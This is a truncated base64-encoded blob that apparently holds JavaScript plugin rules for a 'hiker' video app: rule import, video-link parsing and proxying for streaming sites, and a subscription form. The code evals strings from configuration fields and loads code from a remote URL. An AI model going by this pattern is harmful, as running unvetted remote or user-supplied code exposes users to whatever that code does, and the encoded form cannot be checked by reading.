uKHBhc3MpIHtcXG4gICAgdHJ5IHtcXG4gICAgICAgIGxldCBbXywgcnVsZSwgdHlwZV0gPSBwYXNzLnNwbGl0KFxcXCIkXFxcIik7XFxuICAgICAgICBpZiAodHlwZSA9PT0gXFxcImJcXFwiKSB7XFxuICAgICAgICAgICAgcnVsZSA9IHBhcnNlUGFzdGUocnVsZSk7XFxuICAgICAgICB9XFxuICAgICAgICBsZXQgcnVsZXMgPSBKU09OLnBhcnNlKGJhc2U2NERlY29kZShydWxlKSk7XFxuICAgICAgICBpZiAoIUFycmF5LmlzQXJyYXkocnVsZXMpKSB7XFxuICAgICAgICAgICAgcnVsZXMgPSBbcnVsZXNdO1xcbiAgICAgICAgfVxcbiAgICAgICAgLy9ydWxlcy5yZXZlcnNlKCk7XFxuICAgICAgICBNWV9VUkwgPSBtb2R1bGUuaWQ7XFxuICAgICAgICBsZXQgcnVsZVRpdGxlID0gZ2V0UGFyYW0oXFxcInJ1bGVcXFwiKTtcXG4gICAgICAgIGxldCBhcnIgPSAkLnJlcXVpcmUoXFxcImNvbmZpZ3M/cnVsZT1cXFwiICsgcnVsZVRpdGxlKS5nZXRKc29uKCk7XFxuICAgICAgICBsZXQgbmV3SSA9IDA7XFxuICAgICAgICBmb3IgKGxldCBydWxlIG9mIHJ1bGVzKSB7XFxuICAgICAgICAgICAgbGV0IGluZGV4ID0gYXJyLmZpbmRJbmRleCh2ID0+IHYubmFtZSA9PT0gcnVsZS5uYW1lKTtcXG4gICAgICAgICAgICBpZiAoaW5kZXggPiAtMSkge1xcbiAgICAgICAgICAgICAgICBydWxlID0gT2JqZWN0LmFzc2lnbihhcnJbaW5kZXhdLCBydWxlKTtcXG4gICAgICAgICAgICAgICAgYXJyLnNwbGljZShpbmRleCwgMSwgcnVsZSk7XFxuICAgICAgICAgICAgICAgIGlmIChydWxlcy5sZW5ndGggPT09IDEpIHtcXG4gICAgICAgICAgICAgICAgICAgIHNhdmVDYWNoZShydWxlKTtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9wYWdlL3J1bGVFZGl0I25vSGlzdG9yeSMjbm9SZWNvcmRIaXN0b3J5Iz9pc0ltcG9ydD10cnVlJmluZGV4PVxcXCIgKyBpbmRleCArIFxcXCImcnVsZT1cXFwiICsgcnVsZVRpdGxlO1xcbiAgICAgICAgICAgICAgICAgICAgLy90b2FzdChcXFwi5bey5pu05paw6KeE5YiZ77yaXFxcIiArIHJ1bGUubmFtZSk7XFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICBsb2coXFxcIuW3suabtOaWsOinhOWIme+8mlxcXCIgKyBydWxlLm5hbWUpXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICBuZXdJKys7XFxuICAgICAgICAgICAgICAgIGFyci5wdXNoKHJ1bGUpO1xcbiAgICAgICAgICAgICAgICBpZiAocnVsZXMubGVuZ3RoID09PSAxKSB7XFxuICAgICAgICAgICAgICAgICAgICBzYXZlQ2FjaGUocnVsZSk7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vcGFnZS9ydWxlRWRpdCNub0hpc3RvcnkjI25vUmVjb3JkSGlzdG9yeSM/aXNJbXBvcnQ9dHJ1ZSZydWxlPVxcXCIgKyBydWxlVGl0bGU7XFxuICAgICAgICAgICAgICAgICAgICAvL3RvYXN0KFxcXCLlt7Llr7zlhaXop4TliJnvvJpcXFwiICsgcnVsZS5uYW1lKTtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIGxvZyhcXFwi5bey5a+85YWl6KeE5YiZ77yaXFxcIiArIHJ1bGUubmFtZSlcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgICAgIGlmIChydWxlcy5sZW5ndGggPiAxKSB7XFxuICAgICAgICAgICAgJC5yZXF1aXJlKFxcXCJjb25maWdzP3J1bGU9XFxcIiArIHJ1bGVUaXRsZSkuc2F2ZUpzb24oYXJyKTtcXG4gICAgICAgICAgICB0b2FzdChcXFwi5paw5aKe77yaXFxcIiArIG5ld0kgKyBcXFwiIOimhuebluabtOaWsO+8mlxcXCIgKyAocnVsZXMubGVuZ3RoIC0gbmV3SSkpO1xcbiAgICAgICAgfVxcbiAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICBsb2coZS50b1N0cmluZygpKTtcXG4gICAgICAgIHRvYXN0KFxcXCLlr7zlhaXlpLHotKVcXFwiKTtcXG4gICAgfVxcbn1cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuinhumikeino+aekFwiLFwicGF0aFwiOlwidmlkZW9VcmxcIixcInJ1bGVcIjpcImZ1bmN0aW9uIGlzb2ZmaWNpYWwodXJsKSB7XFxuICBsZXQgZmxhZyA9IG5ldyBSZWdFeHAoJ3FxXFxcXC5jb218aXFpeWlcXFxcLmNvbXx5b3VrdVxcXFwuY29tfG1ndHZcXFxcLmNvbXxiaWxpYmlsaVxcXFwuY29tfHNvaHVcXFxcLmNvbXxpeGlndWFcXFxcLmNvbXxwcHR2XFxcXC5jb218bWlndXZpZGVvXFxcXC5jb218bGVcXFxcLmNvbXwxOTA1XFxcXC5jb218ZnVuXFxcXC50dicpO1xcbiAgcmV0dXJuIGZsYWcudGVzdCh1cmwpO1xcbn1cXG5cXG5mdW5jdGlvbiBwcm94eSh0aXRsZSkge1xcbiAgZnVuY3Rpb24gdG9QYXRoKHZhbHVlKSB7XFxuICAgIGlmICh0eXBlb2YgdmFsdWUgIT09ICdzdHJpbmcnKSB7XFxuICAgICAgcmV0dXJuIFtdO1xcbiAgICB9XFxuICAgIGxldCBwYXRoID0gW107XFxuICAgIGxldCBjdXJyZW50ID0gJyc7XFxuICAgIGxldCBpbkJyYWNrZXRzID0gZmFsc2U7XFxuICAgIGxldCBlc2NhcGUgPSBmYWxzZTtcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCB2YWx1ZS5sZW5ndGg7IGkrKykge1xcbiAgICAgIGxldCBjaGFyID0gdmFsdWVbaV07XFxuICAgICAgaWYgKGVzY2FwZSkge1xcbiAgICAgICAgY3VycmVudCArPSBjaGFyO1xcbiAgICAgICAgZXNjYXBlID0gZmFsc2U7XFxuICAgICAgfSBlbHNlIGlmIChjaGFyID09PSAnXFxcXFxcXFwnKSB7XFxuICAgICAgICBlc2NhcGUgPSB0cnVlO1xcbiAgICAgIH0gZWxzZSBpZiAoY2hhciA9PT0gJy4nICYmICFpbkJyYWNrZXRzKSB7XFxuICAgICAgICBwYXRoLnB1c2goY3VycmVudCk7XFxuICAgICAgICBjdXJyZW50ID0gJyc7XFxuICAgICAgfSBlbHNlIGlmIChjaGFyID09PSAnWycpIHtcXG4gICAgICAgIGluQnJhY2tldHMgPSB0cnVlO1xcbiAgICAgIH0gZWxzZSBpZiAoY2hhciA9PT0gJ10nKSB7XFxuICAgICAgICBpbkJyYWNrZXRzID0gZmFsc2U7XFxuICAgICAgfSBlbHNlIHtcXG4gICAgICAgIGN1cnJlbnQgKz0gY2hhcjtcXG4gICAgICB9XFxuICAgIH1cXG4gICAgaWYgKGN1cnJlbnQpIHtcXG4gICAgICBwYXRoLnB1c2goY3VycmVudCk7XFxuICAgIH1cXG4gICAgcmV0dXJuIHBhdGg7XFxuICB9XFxuXFxuICBmdW5jdGlvbiBnZXRKc29uKG9iaiwgcGF0aCkge1xcbiAgICBpZiAoIW9iaiB8fCAhQXJyYXkuaXNBcnJheShwYXRoKSkge1xcbiAgICAgIHJldHVybiB1bmRlZmluZWQ7XFxuICAgIH1cXG4gICAgaWYgKHBhdGgubGVuZ3RoID09PSAwKSB7XFxuICAgICAgcmV0dXJuIG9iajtcXG4gICAgfVxcbiAgICBsZXQgY3VycmVudCA9IG9iajtcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBwYXRoLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgbGV0IGtleSA9IHBhdGhbaV07XFxuICAgICAgaWYgKGN1cnJlbnQgPT09IG51bGwgfHwgY3VycmVudCA9PT0gdW5kZWZpbmVkIHx8IHR5cGVvZiBjdXJyZW50ICE9PSAnb2JqZWN0Jykge1xcbiAgICAgICAgcmV0dXJuIHVuZGVmaW5lZDtcXG4gICAgICB9XFxuICAgICAgY3VycmVudCA9IGN1cnJlbnRba2V5XTtcXG4gICAgfVxcbiAgICByZXR1cm4gY3VycmVudDtcXG4gIH1cXG4gIHRyeSB7XFxuICAgIGxldCBydW5UeXBlID0gTVlfUEFSQU1TLnJ1blR5cGVbMF07XFxuICAgIGxldCB1cmwgPSBkZWNvZGVVUklDb21wb25lbnQoYmFzZTY0RGVjb2RlKE1ZX1BBUkFNUy51cmxbMF0pKTtcXG4gICAgaWYgKHJ1blR5cGUgPT0gXFxcIkpTT05cXFwiKSB7XFxuXFxuICAgICAgbGV0IHBhcmFtID0gSlNPTi5wYXJzZShkZWNvZGVVUklDb21wb25lbnQoYmFzZTY0RGVjb2RlKE1ZX1BBUkFNUy5wYXJhbVswXSkpKTtcXG4gICAgICBsZXQganNvbiA9IEpTT04ucGFyc2UocmVxdWVzdCh1cmwsIHtcXG4gICAgICAgIGhlYWRlcnM6IHBhcmFtLmhlYWRlcnMgfHwge30sXFxuICAgICAgICBtZXRob2Q6IHBhcmFtLm1ldGhvZCB8fCB2b2lkIDBcXG4gICAgICB9KSk7XFxuICAgICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KHtcXG4gICAgICAgIHN0YXR1c0NvZGU6IDMwMixcXG4gICAgICAgIGhlYWRlcnM6IE9iamVjdC5hc3NpZ24oe30sIHBhcmFtLmhlYWRlcnMgfHwge30sIHtcXG4gICAgICAgICAgXFxcIkxvY2F0aW9uXFxcIjogZ2V0SnNvbihqc29uLCB0b1BhdGgocGFyYW0uanNvblBhdGgpKSxcXG4gICAgICAgIH0pXFxuICAgICAgfSk7XFxuICAgIH0gZWxzZSBpZiAocnVuVHlwZSA9PSBcXFwiSlNcXFwiKSB7XFxuXFxuICAgICAgbGV0IHBhcnNlO1xcbiAgICAgIGlmIChNWV9QQVJBTVMuaW5kZXgpIHtcXG4gICAgICAgIHBhcnNlID0gJC5yZXF1aXJlKFxcXCJjb25maWdzP3J1bGU9XFxcIiArIHRpdGxlKS5nZXRKc29uKClbTVlfUEFSQU1TLmluZGV4WzBdXTtcXG4gICAgICB9IGVsc2Uge1xcbiAgICAgICAgcGFyc2UgPSBKU09OLnBhcnNlKGRlY29kZVVSSUNvbXBvbmVudChiYXNlNjREZWNvZGUoTVlfUEFSQU1TLnBhcmFtWzBdKSkpO1xcbiAgICAgIH1cXG4gICAgICBsZXQgcmVzID0gbmV3IEZ1bmN0aW9uKFxcXCJ1cmxcXFwiLCBcXFwic2VsZlxcXCIsIHBhcnNlLmpzKSh1cmwsIHBhcnNlKTtcXG4gICAgICBpZiAodHlwZW9mIHJlcyA9PT0gXFxcInN0cmluZ1xcXCIpIHtcXG4gICAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeSh7XFxuICAgICAgICAgIHN0YXR1c0NvZGU6IDMwMixcXG4gICAgICAgICAgaGVhZGVyczoge1xcbiAgICAgICAgICAgIFxcXCJMb2NhdGlvblxcXCI6IHJlc1xcbiAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgICB9IGVsc2UgaWYgKCQudHlwZShyZXMpID09PSBcXFwib2JqZWN0XFxcIikge1xcbiAgICAgICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KHtcXG4gICAgICAgICAgc3RhdHVzQ29kZTogMzAyLFxcbiAgICAgICAgICBoZWFkZXJzOiByZXNcXG4gICAgICAgIH0pO1xcbiAgICAgIH1cXG4gICAgfVxcbiAgfSBjYXRjaCAoZSkge1xcbiAgICBsb2coZS50b1N0cmluZygpKTtcXG4gIH1cXG59XFxuXFxuZnVuY3Rpb24gcHJlcGFyZVBhcnNlcyhwYXJzZXMsIHVybCwgcGxheWxpc3QsIGlzVGVzdCkge1xcbiAgcGxheWxpc3QgPSBwbGF5bGlzdCB8fCB7XFxuICAgIHVybHM6IFtdLFxcbiAgICBuYW1lczogW10sXFxuICAgIGhlYWRlcnM6IFtdLFxcbiAgICBpczogXFxcIiNpc1ZpZGVvPXRydWUjXFxcIixcXG4gIH07XFxuICBsZXQgcHJveHlVcmwgPSBzdGFydFByb3h5U2VydmVyKCQudG9TdHJpbmcocHJveHksIE1ZX1JVTEUudGl0bGUpKTtcXG4gIHBhcnNlcy5mb3JFYWNoKCh2LCBpKSA9PiB7XFxuICAgIGlmICh2LmZvcmJpZGRlbikgcmV0dXJuO1xcbiAgICBwbGF5bGlzdC5uYW1lcy5wdXNoKHYubmFtZSk7XFxuICAgIGlmICh2LmhlYWRlcnMpIHtcXG4gICAgICBwbGF5bGlzdC5oZWFkZXJzLnB1c2godi5oZWFkZXJzKTtcXG4gICAgfVxcbiAgICBpZiAodi5ydW5UeXBlID09PSBcXFwiSlNPTlxcXCIpIHtcXG4gICAgICBsZXQgcGFyYW0gPSB7XFxuICAgICAgICAvL3VybDogdi51cmwsXFxuICAgICAgICBtZXRob2Q6IHYubWV0aG9kLFxcbiAgICAgICAgaGVhZGVyczogdi5oZWFkZXJzLFxcbiAgICAgICAganNvblBhdGg6IHYuanNvblBhdGhcXG4gICAgICB9O1xcbiAgICAgIHBsYXlsaXN0LnVybHMucHVzaChwcm94eVVybCArIFxcXCI/cnVuVHlwZT1KU09OJnVybD1cXFwiICsgZW5jb2RlVVJJQ29tcG9uZW50KGJhc2U2NEVuY29kZSh2LnVybCArIHVybCkpICsgXFxcIiZwYXJhbT1cXFwiICsgZW5jb2RlVVJJQ29tcG9uZW50KGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShwYXJhbSkpKSk7XFxuICAgIH0gZWxzZSBpZiAodi5ydW5UeXBlID09PSBcXFwiSlNcXFwiKSB7XFxuICAgICAgcGxheWxpc3QudXJscy5wdXNoKHByb3h5VXJsICsgXFxcIj9ydW5UeXBlPUpTJnVybD1cXFwiICsgZW5jb2RlVVJJQ29tcG9uZW50KGJhc2U2NEVuY29kZSh1cmwpKSArIChpc1Rlc3QgPyBcXFwiJnBhcmFtPVxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQoYmFzZTY0RW5jb2RlKEpTT04uc3RyaW5naWZ5KHYpKSkgOiBcXFwiJmluZGV4PVxcXCIgKyBpKSk7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgcGxheWxpc3QudXJscy5wdXNoKFxcXCJ2aWRlbzovL1xcXCIgKyB2LnVybCArIHVybCk7XFxuICAgIH1cXG4gIH0pO1xcbiAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KHBsYXlsaXN0KTtcXG59XFxuXFxuZnVuY3Rpb24gdXNlUGFyc2VzKHVybCkge1xcbiAgbGV0IHBhcnNlcyA9ICQucmVxdWlyZShcXFwiY29uZmlnc1xcXCIpLmdldEpzb24oKTtcXG4gIGlmICghcGFyc2VzLmxlbmd0aCkgcmV0dXJuIFxcXCJ3ZWI6Ly9cXFwiICsgdXJsO1xcbiAgbGV0IHBsYXlsaXN0ID0ge1xcbiAgICB1cmxzOiBbXSxcXG4gICAgbmFtZXM6IFtdLFxcbiAgICBoZWFkZXJzOiBbXSxcXG4gICAgaXM6IFxcXCIjaXNWaWRlbz10cnVlI1xcXCIsXFxuICB9O1xcbiAgdHJ5IHtcXG4gICAgbGV0IHVzZURhbm11ID0gISFnZXRJdGVtKFxcXCJ1c2VEYW5tdVxcXCIsIFxcXCJcXFwiKTtcXG4gICAgaWYgKHVzZURhbm11KSB7XFxuICAgICAgcGxheWxpc3QuZGFubXUgPSAkLnJlcXVpcmUoJ2RtRnVuP3J1bGU9ZG3nm5LlrZAnKS5kbVJvdXRlKHVybCk7XFxuICAgIH1cXG4gIH0gY2F0Y2ggeyB9XFxuICByZXR1cm4gcHJlcGFyZVBhcnNlcyhwYXJzZXMsIHVybCwgcGxheWxpc3QpO1xcbn1cXG4kLmV4cG9ydHMucGFyc2UgPSBmdW5jdGlvbiAoaW5wdXQsIGlkLCBzb3VyY2UpIHtcXG4gIGxldCBkcnB5ID0gR00uZGVmaW5lTW9kdWxlKFxcXCJEcnB5TWFuYWdlXFxcIikuZ2V0QnlTb3VyY2Uoc291cmNlKTtcXG4gIGlucHV0ID0gaW5wdXQuc3BsaXQoXFxcIiNcXFwiKTtcXG4gIGxldCBwbGF5ID0gSlNPTi5wYXJzZShkcnB5LnBsYXkoaW5wdXRbMV0sIGlucHV0WzBdLnJlcGxhY2UoXFxcInR2Ym94LXhnOlxcXCIsIFxcXCJcXFwiKSwgW10pKTtcXG4gIC8vIGxvZyhwbGF5KVxcbiAgLy8gbG9nKGlkKVxcbiAgLy9sb2cocGxheSlcXG4gIGZ1bmN0aW9uIHBhcnNlUXVlcnkocXVlcnkpIHtcXG4gICAgdmFyIG9iaiA9IHt9O1xcbiAgICBxdWVyeS5zcGxpdChcXFwiJlxcXCIpLmZpbHRlcihlID0+IGUpLmZvckVhY2goZnVuY3Rpb24gKGl0ZW0pIHtcXG4gICAgICB2YXIgcGFydHMgPSBpdGVtLnNwbGl0KFxcXCI9XFxcIik7XFxuICAgICAgb2JqW3BhcnRzWzBdXSA9IHBhcnRzWzFdO1xcbiAgICB9KTtcXG4gICAgcmV0dXJuIG9iajtcXG4gIH1cXG4gIHZhciBleHRyYSA9IHtcXG4gICAgXFxcInVhXFxcIjogTU9CSUxFX1VBXFxuICB9XFxuICBsZXQgcGFyc2UgPSBwbGF5O1xcbiAgbGV0IHBhcnNlX29iaiA9IHtcXG4gICAgZGVmUnVsZXM6IFtcXFwiKi5tcDRcXFwiLCBcXFwiKi5tM3U4XFxcIl0sXFxuICB9O1xcbiAgaWYgKHBhcnNlLmhhc093blByb3BlcnR5KFxcXCJwYXJzZV9leHRyYVxcXCIpKSB7XFxuICAgIGxldCBwYXJzZV9leHRyYSA9IGRlY29kZVVSSUNvbXBvbmVudChwYXJzZS5wYXJzZV9leHRyYSk7XFxuICAgIHBhcnNlX29iaiA9IE9iamVjdC5hc3NpZ24ocGFyc2Vfb2JqLCBwYXJzZVF1ZXJ5KHBhcnNlX2V4dHJhKSk7XFxuICAgIGlmIChwYXJzZV9vYmouaGFzT3duUHJvcGVydHkoXFxcImluaXRfc2NyaXB0XFxcIikpIHtcXG4gICAgICBwYXJzZV9vYmpbXFxcImluaXRfc2NyaXB0XFxcIl0gPSBiYXNlNjREZWNvZGUocGFyc2Vfb2JqW1xcXCJpbml0X3NjcmlwdFxcXCJdKTtcXG4gICAgfVxcbiAgfVxcbiAgaWYgKHBhcnNlX29iai5oYXNPd25Qcm9wZXJ0eShcXFwiaXNfcGNcXFwiKSAmJiBwYXJzZV9vYmpbXFxcImlzX3BjXFxcIl0gPT0gXFxcIjFcXFwiKSB7XFxuICAgIGV4dHJhW1xcXCJ1YVxcXCJdID0gUENfVUE7XFxuICB9XFxuICBpZiAocGFyc2UuaGFzT3duUHJvcGVydHkoXFxcImhlYWRlclxcXCIpKSB7XFxuICAgIGV4dHJhW1xcXCJ1YVxcXCJdID0gcGFyc2VbXFxcImhlYWRlclxcXCJdW1xcXCJVc2VyLUFnZW50XFxcIl07XFxuICAgIC8vZXh0cmFbXFxcInJlZGlyZWN0XFxcIl09ZmFsc2U7XFxuICAgIC8qZXh0cmFbXFxcImpzXFxcIl0gPSAkLnRvU3RyaW5nKChqcykgPT4ge1xcbiAgICAgIGV2YWwoanMpXFxuICAgICAgZmJhLmxvZyhuYXZpZ2F0b3IudXNlckFnZW50KVxcbiAgICAgIGZiYS5sb2cobG9jYXRpb24uaHJlZilcXG4gICAgfSwgJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgT2JqZWN0LmRlZmluZVByb3BlcnR5KG5hdmlnYXRvciwgJ3VzZXJBZ2VudCcsIHtcXG4gICAgICAgIGdldDogZnVuY3Rpb24gKCkge1xcbiAgICAgICAgICByZXR1cm4gJ015LUN1c3RvbS1VQS1TdHJpbmcnO1xcbiAgICAgICAgfVxcbiAgICAgIH0pO1xcbiAgICB9KSkqL1xcbiAgfVxcbiAgaWYgKHBhcnNlX29iai5oYXNPd25Qcm9wZXJ0eShcXFwiY3VzdG9tX3JlZ2V4XFxcIikpIHtcXG4gICAgbGV0IGN1cnJlbnQgPSBwYXJzZV9vYmpbXFxcImRlZlJ1bGVzXFxcIl07XFxuICAgIGV4dHJhW1xcXCJ2aWRlb1J1bGVzXFxcIl0gPSBjdXJyZW50LmNvbmNhdChwYXJzZV9vYmouY3VzdG9tX3JlZ2V4LnNwbGl0KC9cXFxcfC9nKS5maWx0ZXIoZSA9PiBlKSlcXG4gIH1cXG4gIGlmIChwYXJzZS5oYXNPd25Qcm9wZXJ0eShcXFwianNcXFwiKSAmJiBwYXJzZS5qcyAhPSBcXFwiXFxcIikge1xcbiAgICBleHRyYVtcXFwianNcXFwiXSA9ICQudG9TdHJpbmcoKGpzLCBwYXJzZSwgdCkgPT4ge1xcbiAgICAgIGlmIChwYXJzZS5oYXNPd25Qcm9wZXJ0eShcXFwiaW5pdF9zY3JpcHRcXFwiKSkge1xcbiAgICAgICAgZmJhLmxvZyh0ICsgXFxcIjrmiafooYxpbml0X3NjcmlwdFxcXCIpO1xcbiAgICAgICAgZXZhbChwYXJzZS5pbml0X3NjcmlwdCk7XFxuICAgICAgfVxcbiAgICAgIGZiYS5sb2cobmF2aWdhdG9yLnBsYXRmb3JtKTtcXG4gICAgICBmYmEubG9nKHQgKyBcXFwiOuaJp+ihjGpz54K55Ye7XFxcIilcXG4gICAgICBldmFsKGpzKVxcbiAgICB9LCBwYXJzZS5qcywgcGFyc2Vfb2JqLCBNWV9SVUxFLnRpdGxlKVxcbiAgfVxcbiAgbGV0IGl0ZW0gPSBmaW5kSXRlbShpZCk7XFxuICB1cGRhdGVJdGVtKGlkLCB7XFxuICAgIGV4dHJhOiBPYmplY3QuYXNzaWduKHt9LCBpdGVtLmV4dHJhLCBleHRyYSlcXG4gIH0pXFxuXFxuICBpZiAocGxheS51cmwuaW5jbHVkZXMoXFxcInByb3h5P2RvXFxcIikpIHtcXG4gICAgTVlfVVJMID0gcGxheS51cmw7XFxuICAgIHBsYXkudXJsID0gZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXCJ1cmxcXFwiLCBcXFwiXFxcIikpO1xcbiAgfVxcbiAgaWYgKHBsYXkudXJsLnN0YXJ0c1dpdGgoXFxcInB1c2g6Ly9cXFwiKSkge1xcbiAgICBwbGF5LnVybCA9IHBsYXkudXJsLnJlcGxhY2UoXFxcInB1c2g6Ly9cXFwiLCBcXFwiXFxcIik7XFxuICB9XFxuICBpZiAocGxheS51cmwuc3RhcnRzV2l0aChcXFwiaHR0cHM6Ly9wYW4ucXVhcmsuY24vXFxcIikpIHtcXG4gICAgcmV0dXJuIFxcXCJoaWtlcjovL3BhZ2UvcXVhcmtMaXN0P3J1bGU9UXVhcmsu566AJnJlYWx1cmw9XFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChwbGF5LnVybCkgKyBcXFwiJnNoYXJlUHdkPVxcXCI7XFxuICB9XFxuICBpZiAocGxheS51cmwuc3RhcnRzV2l0aCgnaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL3MvJykgfHwgcGxheS51cmwuc3RhcnRzV2l0aChcXFwiaHR0cHM6Ly93d3cuYWxpcGFuLmNvbS9zL1xcXCIpKSB7XFxuICAgIHJldHVybiBcXFwiaGlrZXI6Ly9wYWdlL2FsaXl1bj9ydWxlPeS6keebmOWQmy7nroAmcGFnZT1meXBhZ2UmcmVhbHVybD1cXFwiICsgZW5jb2RlVVJJQ29tcG9uZW50KHBsYXkudXJsKTtcXG4gIH1cXG4gIGlmIChwbGF5LnBhcnNlID09PSAxKSB7XFxuICAgIGlmIChwbGF5LnVybC5zdGFydHNXaXRoKFxcXCJtYWduZXQ6XFxcIikpIHtcXG4gICAgICByZXR1cm4gcGxheS51cmw7XFxuICAgIH1cXG4gICAgaWYgKGlzb2ZmaWNpYWwocGxheS51cmwpICYmIChwbGF5LmZsYWcgfHwgaW5wdXRbMV0pKSB7XFxuICAgICAgcmV0dXJuIHVzZVBhcnNlcyhwbGF5LnVybCk7XFxuICAgIH1cXG4gICAgcmV0dXJuIFxcXCJ2aWRlbzovL1xcXCIgKyBwbGF5LnVybDtcXG4gIH0gZWxzZSBpZiAocGxheS5wYXJzZSA9PT0gMCkge1xcbiAgICBpZiAocGxheS51cmwuc3RhcnRzV2l0aChcXFwibWFnbmV0OlxcXCIpKSB7XFxuICAgICAgcmV0dXJuIHBsYXkudXJsO1xcbiAgICB9XFxuICAgIC8vbG9nKHBsYXkpXFxuICAgIHZhciBwbGF5b2JqID0ge307XFxuICAgIHBsYXlvYmoudXJscyA9IFtwbGF5LnVybCArIFxcXCIjaXNWaWRlbz10cnVlI1xcXCJdO1xcbiAgICBpZiAocGxheS5oYXNPd25Qcm9wZXJ0eShcXFwiaGVhZGVyXFxcIikpIHtcXG4gICAgICBwbGF5b2JqW1xcXCJoZWFkZXJzXFxcIl0gPSBwbGF5LmhlYWRlcjtcXG4gICAgfVxcbiAgICBpZiAocGxheS5oYXNPd25Qcm9wZXJ0eShcXFwiZGFubWFrdVxcXCIpKSB7XFxuICAgICAgcGxheW9ialtcXFwiZGFubXVcXFwiXSA9IHBsYXkuZGFubWFrdTtcXG4gICAgfVxcbiAgICByZXR1cm4gSlNPTi5zdHJpbmdpZnkocGxheW9iaik7XFxuICB9XFxufVxcbiQuZXhwb3J0cy5wcmVwYXJlUGFyc2VzID0gcHJlcGFyZVBhcnNlcztcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuWIm+W7uuiuoumYhVwiLFwicGF0aFwiOlwiY3JlYXRlU3Vic2NyaXB0aW9uXCIsXCJydWxlXCI6XCJqczpcXG5sZXQgbGF5b3V0ID0gW107XFxubGV0IGYgPSAkLnJlcXVpcmUoXFxcImh0dHA6Ly9oaWtlci5ub2tpYS5wcmVzcy9oaWtlcnVsZS9ydWxlbGlzdC5qc29uP2lkPTUwOTlcXFwiKTtcXG5hZGRMaXN0ZW5lcihcXFwib25DbG9zZVxcXCIsICgpID0+IHtcXG4gICAgY2xlYXJNeVZhcihcXFwiZHJweUhpa2VyX3N1Yl9pbnB1dFxcXCIpO1xcbiAgICBjbGVhck15VmFyKFxcXCJkcnB5SGlrZXJfc3VidXJsX2lucHV0XFxcIik7XFxuICAgIGNsZWFyTXlWYXIoXFxcImRycHlIaWtlcl9zdWJuYW1lX2lucHV0XFxcIik7XFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgZGVzYzogXFxcIuiuoumYheWQjeensFxcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcbiAgICAgICAgZGVmYXVsdFZhbHVlOiBcXFwiXFxcIixcXG4gICAgICAgIG9uQ2hhbmdlOiAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwiZHJweUhpa2VyX3N1Ym5hbWVfaW5wdXRcXFwiLCBpbnB1dCk7XFxuICAgICAgICB9KSxcXG4gICAgICAgIGlkOiBcXFwiZHJweUhpa2VyX3N1Ym5hbWVfaW5wdXRcXFwiXFxuICAgIH1cXG59KTtcXG5sZXQgcGF0aCA9IGpvaW5VcmwoZ2V0UGF0aChcXFwiaGlrZXI6Ly9maWxlcy9cXFwiKSwgXFxcIi4uL1xcXCIucmVwZWF0KDUpKS5zbGljZSg3KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi6YCJ5oupXFxcIixcXG4gICAgdXJsOiBKU09OLnN0cmluZ2lmeShmLmZpbGVTZWxlY3Rpb25Vcmkoe1xcbiAgICAgICAgY2FsbGJhY2s6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgICAgIGxldCB0YXJnZXQgPSBmaW5kSXRlbShcXFwiZHJweUhpa2VyX3N1Yl9pbnB1dFxcXCIpLmV4dHJhO1xcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oXFxcImRycHlIaWtlcl9zdWJfaW5wdXRcXFwiLCB7XFxuICAgICAgICAgICAgICAgIGV4dHJhOiBPYmplY3QuYXNzaWduKHRhcmdldCwge1xcbiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdFZhbHVlOiBQQVRIXFxuICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgcmV0dXJuIHRydWU7XFxuICAgICAgICB9KSxcXG4gICAgICAgIHJvb3REaXJQYXRoOiBwYXRoLFxcbiAgICAgICAgaW5pdGlhbFBhdGg6IHBhdGgsXFxuICAgICAgICBwYXR0ZXJuOiAxXFxuICAgIH0pKSxcXG4gICAgY29sX3R5cGU6IFxcXCJpbnB1dFxcXCIsXFxuICAgIGRlc2M6IFxcXCLlgqjlrZjot6/lvoRcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgZGVmYXVsdFZhbHVlOiBcXFwiXFxcIixcXG4gICAgICAgIG9uQ2hhbmdlOiAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwiZHJweUhpa2VyX3N1Yl9pbnB1dFxcXCIsIGlucHV0KTtcXG4gICAgI